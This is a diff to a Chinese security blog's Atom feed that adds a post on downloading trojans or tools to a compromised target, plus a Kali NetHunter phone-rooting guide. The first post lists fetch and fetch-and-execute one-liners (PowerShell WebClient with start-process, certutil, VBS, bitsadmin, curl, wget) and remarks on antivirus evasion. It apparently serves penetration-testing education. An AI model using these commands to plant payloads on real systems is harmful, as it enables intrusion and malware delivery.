@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-03-10T00:30:47.559Z</updated>
+  <updated>2020-04-05T04:38:20.762Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,34 +17,22 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Writeup</title>
-    <link href="http://yoursite.com/2020/03/10/djinn2/"/>
-    <id>http://yoursite.com/2020/03/10/djinn2/</id>
-    <published>2020-03-10T00:27:52.000Z</published>
-    <updated>2020-03-10T00:30:47.559Z</updated>
+    <title>shell中文件下载方法</title>
+    <link href="http://yoursite.com/2020/04/04/shell%E4%B8%8B%E8%BD%BD/"/>
+    <id>http://yoursite.com/2020/04/04/shell%E4%B8%8B%E8%BD%BD/</id>
+    <published>2020-04-04T01:59:20.000Z</published>
+    <updated>2020-04-05T04:38:20.762Z</updated>
+    
+    <content type="html"><![CDATA[<p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p><h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>)</span><br></pre></td></tr></table></figure><p>下载并执行文件：（无文件模式不易检测）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>);<span class="built_in">start-process</span> <span class="string">'C:\test\1.exe'</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="Certutil："><a href="#Certutil：" class="headerlink" title="Certutil："></a>Certutil：</h3><ul><li>保存在当前路径，文件名称同URL</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><ul><li>保存在当前路径，指定保存文件名称</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php</span><br></pre></td></tr></table></figure><p>使用downloader默认在缓存目录位置：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code>保存下载的文件二进制副本。</p><ul><li>命令行删除缓存</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</span><br></pre></td></tr></table></figure><ul><li>查看缓存项目</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache *</span><br></pre></td></tr></table></figure><h3 id="Vbs："><a href="#Vbs：" class="headerlink" title="Vbs："></a>Vbs：</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象<br>使用echo逐行追加写入(&gt;&gt;)test.vbs</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Set Post = CreateObject("Msxml2.XMLHTTP")</span><br><span class="line">Set Shell = CreateObject("Wscript.Shell")</span><br><span class="line">Post.Open "GET","http://192.168.1.1/1.exe",0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject("ADODB.Stream")</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile "C:\test\1.exe",2</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure><h3 id="Bitsadmin："><a href="#Bitsadmin：" class="headerlink" title="Bitsadmin："></a>Bitsadmin：</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://<span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">1</span>.exe  C:\test\update\<span class="number">1</span>.exe</span><br></pre></td></tr></table></figure><p>不支持https、ftp协议，php python带的服务器会出错，下载速度较慢</p><h3 id="Curl："><a href="#Curl：" class="headerlink" title="Curl："></a>Curl：</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><p>保存网页中的文件，要注意这里后面的url要具体到某个文件，不然抓不下来</p><h3 id="Wget："><a href="#Wget：" class="headerlink" title="Wget："></a>Wget：</h3><p>Linux系统中的wget是一个下载文件的工具， 简单直接，支持递归下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><p>对下载文件重命名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O  new.exe  http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure><p>限速下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --limit-rate=300k http://192.168.1.1/1.exe</span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
-    </summary>
-    
-    
-      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
-    
-    
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>curl常用示例</title>
-    <link href="http://yoursite.com/2019/05/08/curl%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B/"/>
-    <id>http://yoursite.com/2019/05/08/curl%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B/</id>
-    <published>2019-05-08T01:59:20.000Z</published>
-    <updated>2020-03-10T00:31:51.544Z</updated>
-    
-    <summary type="html">
+      &lt;p&gt;&lt;font color=green&gt;获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法&lt;/font&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Powershell：&quot;&gt;&lt;a href=&quot;#Powershell：&quot; class=&quot;headerlink&quot; title=&quot;Powershell：&quot;&gt;&lt;/a&gt;Powershell：&lt;/h3&gt;&lt;p&gt;下载并保存文件：（容易被杀毒软件检测）&lt;/p&gt;
+&lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;powershell (&lt;span class=&quot;built_in&quot;&gt;new-object&lt;/span&gt; System.Net.WebClient).DownloadFile(&lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.1/1.exe&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;C:\test\1.exe&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;下载并执行文件：（无文件模式不易检测）&lt;/p&gt;
+&lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;powershell (&lt;span class=&quot;built_in&quot;&gt;new-object&lt;/span&gt; System.Net.WebClient).DownloadFile(&lt;span class=&quot;string&quot;&gt;&#39;http://192.168.1.1/1.exe&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;C:\test\1.exe&#39;&lt;/span&gt;);&lt;span class=&quot;built_in&quot;&gt;start-process&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;C:\test\1.exe&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
     
     </summary>
     
@@ -55,6 +43,29 @@
       <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
     
       <category term="network" scheme="http://yoursite.com/tags/network/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一加5手机上部署kali nethunter</title>
+    <link href="http://yoursite.com/2020/03/20/oneplus-install-nethunter/"/>
+    <id>http://yoursite.com/2020/03/20/oneplus-install-nethunter/</id>
+    <published>2020-03-19T16:36:00.000Z</published>
+    <updated>2020-03-20T10:31:44.262Z</updated>
+    
+    <content type="html"><![CDATA[<p>为弘扬中华民族美德-勤俭持家，利用闲暇时间将手中的oneplus 5变废为宝。<br>Kali Linux NetHunter是一个开源的Android渗透测试平台，它可以轻松的使用各种安全工具，详情介绍请查阅官方网站。<br><font color=green>本文章基于oneplus 5手机，其它手机型号方法类似；各项基础知识不在文章赘述范围之内，自行了解；所需全部文件在末尾链接出，下面进入干货环节。</font><a id="more"></a><br><font color=red><strong>数据无价，任何操作前请确认数据已备份</strong>！！！</font></p><h4 id="1、刷入新的ROM系统"><a href="#1、刷入新的ROM系统" class="headerlink" title="1、刷入新的ROM系统"></a><strong>1、刷入新的ROM系统</strong></h4><p>国行的一加手机默认使用的是氢OS，而氧OS则自带google全家桶，在应用权限上也有区别，更多两者的区别信息自行查询。<br>1）下载氧OS ROM包；拷入手机根目录</p><p><img src="/images/upload/image-20200320005727319.png" alt="">2）手机数据双清操作；关机，然后后按住音量减键和锁屏键进入recovery  mode<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG" >选择清除数据和缓存<br><img width=30% height=10% src="/images/upload/IMG_0561.JPG">然后点击完成！<br>3）刷入氧OS ROM包<br><img width=30% height=10% src="/images/upload/IMG_0560.JPG">点击安装本地升级文件，选中刚刚拷入的ROM包，等待安装完成，如下图<br><img width=30% height=10% src="/images/upload/IMG_0555.JPG"><strong>不要连接网络，会连接google检查更新，先跳过！！</strong></p><h4 id="2、获取ROOT权限"><a href="#2、获取ROOT权限" class="headerlink" title="2、获取ROOT权限"></a><strong>2、获取ROOT权限</strong></h4><p>1）开启手机开发者模式，打开usb调试选项；打开oem解锁；将手机设置为滑动解锁，通过usb数据线连接电脑<br>2）Windows下载安装mininal adb and fastboot软件<br><img width=30% height=10% src="/images/upload/img_000.png"><img width=50% height=10% src="/images/upload/img_001.png">3）下载第三方Recovery mode；将其放入mininal adb安装目录下，以方便操作<br><img width=30% height=10% src="/images/upload/img_002.png">4）下载Magisk Manager压缩包，拷入手机根目录（使用脸谱获得root权限）<br><img width=30% height=10% src="/images/upload/img_003.png">5）命令行进入adb安装目录；执行如下命令进入recovery mode<br><img width=50% height=10% src="/images/upload/img_004.png">然后点击高级—进入刷机模式<br><img width=50% height=10% src="/images/upload/img_005.png"><img width=50% height=10% src="/images/upload/img_006.jpg">6）然后解锁OEM<br><img width=50% height=10% src="/images/upload/img_007.png">片刻后出现界面，选择unlock the bootloader<img width=50% height=10% src="/images/upload/img_008.jpg"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;为弘扬中华民族美德-勤俭持家，利用闲暇时间将手中的oneplus 5变废为宝。&lt;br&gt;Kali Linux NetHunter是一个开源的Android渗透测试平台，它可以轻松的使用各种安全工具，详情介绍请查阅官方网站。&lt;br&gt;&lt;font color=green&gt;本文章基于oneplus 5手机，其它手机型号方法类似；各项基础知识不在文章赘述范围之内，自行了解；所需全部文件在末尾链接出，下面进入干货环节。&lt;/font&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
